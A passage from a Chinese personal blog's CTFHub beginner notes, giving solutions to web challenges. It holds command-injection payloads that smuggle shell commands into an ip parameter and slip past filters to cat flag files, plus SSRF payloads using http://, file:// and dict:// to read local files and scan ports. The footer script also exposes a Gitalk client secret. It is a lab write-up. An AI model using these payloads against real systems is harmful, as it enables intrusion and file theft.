<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0als</span><br><span class="line">?ip&#x3D;127.0.0.1%0als%09*is_here</span><br><span class="line">? # 查看flag_is_here文件夹下的文件ip&#x3D;127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_98358017212.php</span><br><span class="line"># 注：%0a代替换行，%09代替TAB键（因为flag被过滤了，所以我们通过TAB来补全flag_is_here）</span><br><span class="line">　　%5c代替\（用\来分隔开cat，因为cat也被过滤了qwq）</span><br></pre></td></tr></table></figure>

<p>在f12中能看到答案</p>
<figure class="highlight plain"><figcaption><span>source可以用ls sour\*，还可以使用ls \*rce</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 题解二</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;cmd</span><br><span class="line">  127.0.0.1%0als$&#123;IFS&#125;fl$*ag_is_here </span><br><span class="line">  127.0.0.1%0acd$&#123;IFS&#125;fl$ag_is_here%0aca&#39;&#39;t$&#123;IFS&#125;fl$a*g_230191972813921.php # 因为过滤了cat，我们这里使用单引号绕过过滤，如ca&#39;&#39;t 构造payload</span><br></pre></td></tr></table></figure>

<p>其中<code>&#39;&#39;</code>可以用<code>%27</code>代替，将cat的任意字母包裹。</p>
</li>
</ul>
<h3><span id="ssrf">SSRF</span></h3><blockquote>
<p>SSRT(Server-Side Request Forgery，服务器端请求伪造)，就是攻击者利用服务器能访问其他的服务器的功能，通过自己的构造服务器请求来攻击与外界不相连接的内网，我们知道内网与外网是不相通的，所以利用这一个特性，就可以利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。</p>
</blockquote>
<p><img src="a622392d2eac336271e32e052def5adc.png" alt="ssrf"></p>
<p><a href="https://blog.csdn.net/qq_51295677/article/details/124697338" target="_blank" rel="noopener">reference</a></p>
<h4><span id="内网访问">内网访问</span></h4><ul>
<li>考察<code>http://</code>协议</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<h4><span id="伪协议读取文件">伪协议读取文件</span></h4><ul>
<li>这一题的考点主要是<strong>file协议</strong>读取文件</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h4><span id="端口扫描">端口扫描</span></h4><ul>
<li>考察<code>dict://</code>协议</li>
</ul>
<p>使用burp suite进行端口扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:§§ HTTP&#x2F;1.1</span><br><span class="line">Host: challenge-235c64bde60462f1.sandbox.ctfhub.com:10800</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;103.0.0.0 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>然后注入使用数字从8000-9000，步进为1，发现端口<code>8243</code>的数据长度不一致。使用<code>http://</code>访问，<em>http可以忽略</em></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://<span class="title">challenge</span>-235<span class="title">c64bde60462f1.sandbox.ctfhub.com</span>:10800/?<span class="title">url</span>=127.0.0.1:8243</span></span><br></pre></td></tr></table></figure>

<h4><span id="post请求">POST请求</span></h4><p><code>CRLF</code>: “\r\n”, windows系统环境下的换行方式</p>
<p><code>LF</code>: “\n”, Linux系统环境下的换行方式</p>
<p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。所以我们需要两次编码</p>
<h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1></div><div class="tags"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a></div><div class="post-nav"><a class="next" href="/2022/12/23/Spring%20Security/">Spring Security</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=0.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=0.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=0.0.0"></script><script>var gitalk = new Gitalk({
  clientID: 'd154fff64901622afbb6',
  clientSecret: '5b3f1d58c331b54703e4477e1f8fa1e42e9c1082',
  repo: 'Disda-coding.github.io',
  owner: 'Disda-coding',
  admin: ['Disda-coding'],
  id: md5(location.pathname),
  distractionFreeMode: false
})
gitalk.render('container')
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Algorithm/">Algorithm</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/">Spring</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/design-pattern/">design pattern</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/log/">log</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pandas/">pandas</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E8%80%83%E7%82%B9/">分布式考点</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%90%E7%A0%81/">源码</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A2%E7%BB%8F/">面经</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">19</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" style="font-size: 15px;">设计模式</a> <a href="/tags/%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%80%83%E7%AE%97%E6%B3%95%E9%A2%98/" style="font-size: 15px;">面试常考算法题</a> <a href="/tags/Java%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 15px;">Java虚拟机</a> <a href="/tags/C/" style="font-size: 15px;">C++</a> <a href="/tags/%E9%98%BF%E9%87%8C%E9%9D%A2%E8%AF%95/" style="font-size: 15px;">阿里面试</a> <a href="/tags/Algorithm/" style="font-size: 15px;">Algorithm</a> <a href="/tags/%E9%93%BE%E8%A1%A8/" style="font-size: 15px;">链表</a> <a href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/" style="font-size: 15px;">大数据</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">机器学习</a> <a href="/tags/%E6%BA%90%E7%A0%81/" style="font-size: 15px;">源码</a> <a href="/tags/Spring/" style="font-size: 15px;">Spring</a> <a href="/tags/Java%E5%B8%B8%E7%94%A8%E7%B1%BB%E5%BA%93%E4%B8%8E%E6%8A%80%E5%B7%A7/" style="font-size: 15px;">Java常用类库与技巧</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 15px;">计算机网络</a> <a href="/tags/java/" style="font-size: 15px;">java</a> <a href="/tags/%E5%AE%9E%E4%B9%A0/" style="font-size: 15px;">实习</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 15px;">数据库</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a> <a href="/tags/%E6%A0%91/" style="font-size: 15px;">树</a> <a href="/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" style="font-size: 15px;">动态规划</a> <a href="/tags/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/" style="font-size: 15px;">java多线程</a> <a href="/tags/git/" style="font-size: 15px;">git</a> <a href="/tags/%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/" style="font-size: 15px;">实习日记</a> <a href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" style="font-size: 15px;">面试题</a> <a href="/tags/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/" style="font-size: 15px;">Java多线程</a> <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 15px;">中间件</a> <a href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" style="font-size: 15px;">消息队列</a> <a href="/tags/redis/" style="font-size: 15px;">redis</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 15px;">操作系统</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE-pandas/" style="font-size: 15px;">机器学习 大数据 pandas</a> <a href="/tags/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/" style="font-size: 15px;">排序算法</a> <a href="/tags/spring/" style="font-size: 15px;">spring</a> <a href="/tags/%E9%A1%B9%E7%9B%AE/" style="font-size: 15px;">项目</a> <a href="/tags/%E5%89%91%E6%8C%87Offer/" style="font-size: 15px;">剑指Offer</a> <a href="/tags/HashMap/" style="font-size: 15px;">HashMap</a> <a href="/tags/Tencent/" style="font-size: 15px;">Tencent</a> <a href="/tags/SpringBoot/" style="font-size: 15px;">SpringBoot</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/03/29/ctf/">CTFHub入门笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/23/Spring%20Security/">Spring Security</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/22/git/">Git操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/13/Pandas/">Pandas基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/MachineLearning/">机器学习基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/">机器学习时间序列实战</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1/">大数据建模</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/28/Tencent-intern-LOG/">鹅场的日记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/07/SCF/">Tencent-SCF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/07/yiqing/">SCF之疫情地图</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://cyc2018.github.io/CS-Notes/#/README" title="CS-Note" target="_blank">CS-Note</a><ul></ul><a href="https://www.javadoop.com/" title="Java源码解析" target="_blank">Java源码解析</a><ul></ul><a href="https://github.com/Disda-coding/advanced-java" title="Java 工程师进阶知识完全扫盲" target="_blank">Java 工程师进阶知识完全扫盲</a><ul></ul><a href="https://github.com/Disda-coding/Java-concurrency" title="Java高并发" target="_blank">Java高并发</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2023 <a href="/." rel="nofollow">Disda.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> </a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Disda.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//lib.baomitu.com/clipboard.js/2.0.4/clipboard.min.js"></script><script type="text/javascript" src="//lib.baomitu.com/toastr.js/2.1.4/toastr.min.js"></script><link rel="stylesheet" href="//lib.baomitu.com/toastr.js/2.1.4/toastr.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>